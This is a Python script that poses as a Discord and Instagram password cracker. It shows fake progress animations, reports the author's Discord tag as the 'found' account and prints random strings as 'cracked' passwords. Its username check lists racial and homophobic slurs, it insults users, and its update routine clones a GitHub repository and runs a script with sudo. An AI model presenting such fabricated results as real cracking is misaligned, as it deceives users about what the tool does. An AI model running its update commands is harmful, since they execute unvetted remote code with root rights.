import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
from time import sleep
import time
import os, platform
import random, string
import re
import json
from urllib.request import Request, urlopen
import webbrowser

rp = random.SystemRandom()
length = 10
alphabet = string.ascii_letters + string.digits
password = str().join(rp.choice(alphabet) for _ in range(length))

super = random.SystemRandom()
length = 10
alphabet = string.ascii_letters + string.digits
dispass = str().join(super.choice(alphabet) for _ in range(length))

niceness = random.SystemRandom()
length = 10
alphabet = string.ascii_letters + string.digits
termdispass = str().join(niceness.choice(alphabet) for _ in range(length))

kool = random.SystemRandom()
length = 10
alphabet = string.ascii_letters + string.digits
instapassword = str().join(kool.choice(alphabet) for _ in range(length))

idek = random.SystemRandom()
length = 10
alphabet = string.ascii_letters + string.digits
facepass = str().join(idek.choice(alphabet) for _ in range(length))

# The screen clear function
def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')

yes = set(['yes', 'y', 'ye', 'Y'])
no = set(['no', 'n', 'N', 'NO'])

uplogo = Fore.RED + """
            ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗
            ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
            ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  
            ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  
            ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗
             ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
"""

instalogo = Fore.RED + """
            ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗
            ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
            ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║
            ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
            ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
            ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
"""


termlogo = Fore.RED + """
╦ ╦╔═╗═╗ ╦╔═╗╦═╗                               
╠═╣╠═╣╔╩╦╝║ ║╠╦╝                               
╩ ╩╩ ╩╩ ╚═╚═╝╩╚═                               
┌─┐┌─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐  ┌─┐┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐
├─┘├─┤└─┐└─┐││││ │├┬┘ ││  │  ├┬┘├─┤│  ├┴┐├┤ ├┬┘
┴  ┴ ┴└─┘└─┘└┴┘└─┘┴└──┴┘  └─┘┴└─┴ ┴└─┘┴ ┴└─┘┴└─
"""


logo = Fore.RED + """    
            ██╗  ██╗ █████╗ ██╗  ██╗ ██████╗ ██████╗ 
            ██║  ██║██╔══██╗╚██╗██╔╝██╔═══██╗██╔══██╗
            ███████║███████║ ╚███╔╝ ██║   ██║██████╔╝
            ██╔══██║██╔══██║ ██╔██╗ ██║   ██║██╔══██╗
            ██║  ██║██║  ██║██╔╝ ██╗╚██████╔╝██║  ██║
            ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
            ┌─┐┌─┐┌─┐┌─┐┬ ┬┌─┐┬─┐┌┬┐  ┌─┐┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐
            ├─┘├─┤└─┐└─┐││││ │├┬┘ ││  │  ├┬┘├─┤│  ├┴┐├┤ ├┬┘
            ┴  ┴ ┴└─┘└─┘└┴┘└─┘┴└──┴┘  └─┘┴└─┴ ┴└─┘┴ ┴└─┘┴└─
"""

wrong = Fore.RED + """
            ██╗███╗   ██╗██╗   ██╗ █████╗ ██╗     ██╗██████╗      ██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗
            ██║████╗  ██║██║   ██║██╔══██╗██║     ██║██╔══██╗    ██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
            ██║██╔██╗ ██║██║   ██║███████║██║     ██║██║  ██║    ██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║
            ██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║    ██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║
            ██║██║ ╚████║ ╚████╔╝ ██║  ██║███████╗██║██████╔╝    ╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║
            ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝      ╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                     ╔═╗┬ ┬┌─┐┌─┐┌─┐┌─┐  ╔═╗┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐
                                     ║  ├─┤│ ││ │└─┐├┤   ╠═╣││││ │ │ ├─┤├┤ ├┬┘
                                     ╚═╝┴ ┴└─┘└─┘└─┘└─┘  ╩ ╩┘└┘└─┘ ┴ ┴ ┴└─┘┴└
"""

termwrong = Fore.RED + """
╦╔╗╔╦  ╦╔═╗╦  ╦╔╦╗  ╔═╗╔═╗╔╦╗╦╔═╗╔╗╔     
║║║║╚╗╔╝╠═╣║  ║ ║║  ║ ║╠═╝ ║ ║║ ║║║║     
╩╝╚╝ ╚╝ ╩ ╩╩═╝╩═╩╝  ╚═╝╩   ╩ ╩╚═╝╝╚╝     
┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐  ┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐
│  ├─┤│ ││ │└─┐├┤   ├─┤││││ │ │ ├─┤├┤ ├┬┘
└─┘┴ ┴└─┘└─┘└─┘└─┘  ┴ ┴┘└┘└─┘ ┴ ┴ ┴└─┘┴└─
"""


dislogo = Fore.RED + """ 
            ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
            ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
            ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
            ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
            ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
            ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
"""

warning = Fore.RED + """
            ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
            ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
            ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
            ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
            ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
            ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
"""

fairuse = Fore.RED + """
            ███████╗ █████╗ ██╗██████╗     ██╗   ██╗███████╗███████╗
            ██╔════╝██╔══██╗██║██╔══██╗    ██║   ██║██╔════╝██╔════╝
            █████╗  ███████║██║██████╔╝    ██║   ██║███████╗█████╗  
            ██╔══╝  ██╔══██║██║██╔══██╗    ██║   ██║╚════██║██╔══╝  
            ██║     ██║  ██║██║██║  ██║    ╚██████╔╝███████║███████╗
            ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚══════╝
"""

termuxwarning = Fore.RED + """
╦ ╦╔═╗╦═╗╔╗╔╦╔╗╔╔═╗
║║║╠═╣╠╦╝║║║║║║║║ ╦
╚╩╝╩ ╩╩╚═╝╚╝╩╝╚╝╚═╝
"""

termuxdislogo = Fore.RED + """
╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
 ║║║╚═╗║  ║ ║╠╦╝ ║║
═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝
"""

termuxfairuse = Fore.RED + """
╔═╗╔═╗╦╦═╗  ╦ ╦╔═╗╔═╗
╠╣ ╠═╣║╠╦╝  ║ ║╚═╗║╣ 
╚  ╩ ╩╩╩╚═  ╚═╝╚═╝╚═╝
"""

terminstalogo = Fore.RED + """
╦╔╗╔╔═╗╔╦╗╔═╗╔═╗╦═╗╔═╗╔╦╗
║║║║╚═╗ ║ ╠═╣║ ╦╠╦╝╠═╣║║║
╩╝╚╝╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩╩ ╩
"""
secretlogo = Fore.RED + """
███████╗███████╗ ██████╗██████╗ ███████╗████████╗
██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝
███████╗█████╗  ██║     ██████╔╝█████╗     ██║   
╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   
███████║███████╗╚██████╗██║  ██║███████╗   ██║   
╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
"""

secrettermlogo = Fore.RED + """
╔═╗┌─┐┌─┐┬─┐┌─┐┌┬┐
╚═╗├┤ │  ├┬┘├┤  │ 
╚═╝└─┘└─┘┴└─└─┘ ┴ 
"""

facebooklogo = Fore.RED + """
███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═
"""

termfacebook = Fore.RED + """
╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐
╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
"""

cannotlogo = Fore.RED + """
 ██████╗ █████╗ ███╗   ██╗███╗   ██╗ ██████╗ ████████╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗
██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔═══██╗╚══██╔══╝    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
██║     ███████║██╔██╗ ██║██╔██╗ ██║██║   ██║   ██║       ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  
██║     ██╔══██║██║╚██╗██║██║╚██╗██║██║   ██║   ██║       ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  
╚██████╗██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝   ██║       ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝        ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝                                    
"""

screen_clear()
print("This is your current os\r\n" + Fore.LIGHTBLUE_EX + platform.system() + " " + platform.release())
sleep(5)

def start():
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack | ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack / ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack - ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack | ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack / ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack - ")
    sleep(1)
    screen_clear()
    print(logo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(3)
    screen_clear()

def termstart():
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker.")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker..")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "initialize password cracker...")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack | ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack / ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack - ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack | ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack / ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack - ")
    sleep(1)
    screen_clear()
    print(termlogo + Fore.CYAN + "Loading Ncrack \ ")
    sleep(3)
    screen_clear()

def winuse():
    if fairchoice in yes:
            screen_clear()
            print(fairuse + Fore.GREEN + "Thank you, Proceeding")
            sleep(2)
            start()
    if fairchoice in no:
            screen_clear()
            print(warning + Fore.CYAN + "WRONG CHOICE, CLOSING")
            sleep(2)
            screen_clear()
            print(dislogo + Fore.CYAN + "ADD ME ON DISCORD BEFORE YOU GO Alt+F4#0999 ;)")
            sleep(3)
            screen_clear()
            exit()

def termuse():
    if fairchoiceterm in yes:
            screen_clear()
            print(termuxfairuse + Fore.GREEN + "Thank you, Proceeding")
            sleep(2)
            termstart()
    if fairchoiceterm in no:
            screen_clear()
            print(termuxwarning + Fore.CYAN + "WRONG CHOICE, CLOSING")
            sleep(2)
            screen_clear()
            print(termuxdislogo + Fore.CYAN + "ADD ME ON DISCORD BEFORE YOU GO Alt+F4#0999 ;)")
            sleep(3)
            screen_clear()
            exit()


def supstart():
    print(termuxwarning + Fore.CYAN + "PLEASE REPORT ANY BUGS TO ME PERSONALLY Alt+F4#0999")
    sleep(4)
    screen_clear()
    print(termuxfairuse + Fore.CYAN + "THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY")
    sleep(2)
    global fairchoiceterm
    fairchoiceterm = input(Fore.CYAN + "Do you agree to use educationally? Y/N: ")
    if os.name == 'posix':
        termuse()
    else:
        winuse()

def winstart():
    print(warning + Fore.CYAN + "PLEASE REPORT ANY BUGS TO ME PERSONALLY Alt+F4#0999")
    sleep(4)
    screen_clear()
    print(fairuse + Fore.CYAN + "THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY")
    sleep(2)
    global fairchoice
    fairchoice = input(Fore.CYAN + "Do you agree to use educationally? Y/N: ")
    if os.name == 'posix':
        termuse()
    else:
        winuse()

screen_clear()
if os.name == 'posix':
      supstart()
else:
      winstart()

def termerror():
    screen_clear()
    print(Fore.RED + termwrong)
    sleep(5)
    screen_clear()
    termmenu()

def error():
    screen_clear()
    print(Fore.RED + wrong)
    sleep(5)
    screen_clear()
    menu()

def termDis():
    screen_clear()
    termcool = "@gmail.com"
    global choicedisterm
    choicedisterm = input(termuxdislogo + Fore.CYAN + "Please Enter Email: ")
    if termcool in choicedisterm:
       print(Fore.GREEN + "Email Valid Proceeding")
       sleep(2)
       termDis2()
    else:
        screen_clear()
        print(termuxdislogo + Fore.RED + "invalid Email Retard, Try Again")
        sleep(2)
        termDis()
        
def termDis2():
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + ".")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + "..")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + "...")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + ".")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + "..")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedisterm + "...")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.GREEN + "Account Found, Account is: Alt+F4#0999 {Add me ;)}")
    sleep(3)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password.")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password..")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password...")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password.")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password..")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.LIGHTYELLOW_EX + "Checking for Password...")
    sleep(2)
    screen_clear()
    print (termuxdislogo + Fore.GREEN + "Done password successfully cracked")
    sleep(1)
    screen_clear()
    print (termuxdislogo + Fore.GREEN + "Password is: " + termdispass)
    sleep(3)
    termmenu()

def Dis():
    screen_clear()
    cool = "@gmail.com"
    global choicedis
    choicedis = input(dislogo + Fore.CYAN + "Please Enter Email: ")
    if cool in choicedis:
       print(Fore.GREEN + "Email Valid Proceeding")
       sleep(2)
       Dis2()
    else:
        screen_clear()
        print(dislogo + Fore.RED + "invalid Email Retard, Try Again")
        sleep(2)
        Dis()
        
def Dis2():
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + ".")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + "..")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + "...")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + ".")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + "..")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Accounts associated with: " + choicedis + "...")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.GREEN + "Account Found, Account is: Alt+F4#0999 {Add me ;)}")
    sleep(3)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password.")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password..")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password...")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password.")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password..")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.LIGHTYELLOW_EX + "Checking for Password...")
    sleep(2)
    screen_clear()
    print (dislogo + Fore.GREEN + "Done password successfully cracked")
    sleep(1)
    screen_clear()
    print (dislogo + Fore.GREEN + "Password is: " + dispass)
    sleep(3)
    menu()

def insta():
    screen_clear()
    cool = "nigga"
    cool2 = "faggot"
    cool3 = "beaner"
    cool4 = "wetback"
    cool5 = "spic"
    cool6 = "Nigga"
    cool7 = "Faggot"
    cool8 = "Beaner"
    cool9 = "Wetback"
    cool10 = "Spic"
    global choice3
    print(instalogo)
    choice3 = input(Fore.CYAN + "Please Enter IG Username: ")
    if cool in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool2 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool3 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool4 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool5 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool6 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool7 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool8 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool9 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    if cool10 in choice3:
        screen_clear()
        print(instalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        insta()
    else:
        screen_clear()
        print(instalogo + Fore.GREEN + "This user is valid. Proceeding")
        sleep(3)
        screen_clear()
        insta2()

def insta2():
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + ".")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + "..")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + "...")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + ".")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + "..")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + choice3 + "...")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.GREEN + "Instagram account with the name: " + choice3 + " Found!")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(instalogo + Fore.GREEN + "Password found: " + password)
    sleep(2)
    screen_clear()
    print(instalogo + Fore.GREEN + "Username: " + choice3 + """
Password: """ + password)
    sleep(4)
    menu()

def terminsta():
    screen_clear()
    termcool = "nigga"
    termcool2 = "faggot"
    termcool3 = "beaner"
    termcool4 = "wetback"
    termcool5 = "spic"
    termcool6 = "Nigga"
    termcool7 = "Faggot"
    termcool8 = "Beaner"
    termcool9 = "Wetback"
    termcool10 = "Spic"
    termcool11 = " "
    global termchoice3
    print(terminstalogo)
    termchoice3 = input(Fore.CYAN + "Please Enter IG Username: ")
    if termcool in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool2 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool3 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool4 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool5 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool6 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool7 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool8 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool9 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool10 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        terminsta()
    if termcool11 in termchoice3:
        screen_clear()
        print(terminstalogo + Fore.RED + "Username cannot be blank")
        sleep(3)
        screen_clear()
        terminsta()
    else:
        screen_clear()
        print(terminstalogo + Fore.GREEN + "This user is valid. Proceeding")
        sleep(3)
        screen_clear()
        terminsta2()

def terminsta2():
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + ".")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + "..")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + "...")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + ".")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + "..")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for instagram accounts with the name: " + termchoice3 + "...")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.GREEN + "Instagram account with the name: " + termchoice3 + " Found!")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.GREEN + "Password found: " + instapassword)
    sleep(2)
    screen_clear()
    print(terminstalogo + Fore.GREEN + "Username: " + termchoice3 + """
Password: """ + instapassword)
    sleep(4)
    termmenu()




def update():
    screen_clear()
    print (uplogo + Fore.LIGHTYELLOW_EX + "This Tool is Only Available for Termux and Similar Systems. ")
    choiceupdate = input("Continue Y / N: ")
    if choiceupdate in yes:
        os.system("cd Desktop")
        os.system("rm -rf HackingAri")
        os.system("git clone https://github.com/ayooo-glizzy/HackingAri.git")
        os.system("cd Exploit-Tools && sudo bash ./update.sh")
        os.system("HackingAri")
    else:
        screen_clear()
        print(uplogo + Fore.RED + "The Password Cracker was not updated")
        sleep(2)
        menu()

def cantthing():
    screen_clear()
